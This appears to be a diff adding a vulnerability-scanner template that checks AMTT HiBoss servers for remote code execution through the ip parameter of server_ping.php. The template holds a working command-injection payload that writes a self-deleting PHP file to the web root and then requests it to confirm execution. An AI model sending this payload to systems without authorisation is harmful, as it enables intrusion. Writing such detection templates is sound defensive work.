@@ -1,0 +1,16 @@
+cve-id: amtt-hiboss-server-ping-rce
+set:
+  r2: randomLowercase(10)
+rules:
+  - method: GET
+    path: /manager/radius/server_ping.php?ip=127.0.0.1|echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>">../../{{r2}}.php&id=1
+    expression: |
+      response.status == 200 && response.body.bcontains(b"parent.doTestResult")
+  - method: GET
+    path: /{{r2}}.php
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(r2)))
+severity:
+  critical
+type: 
+  rce
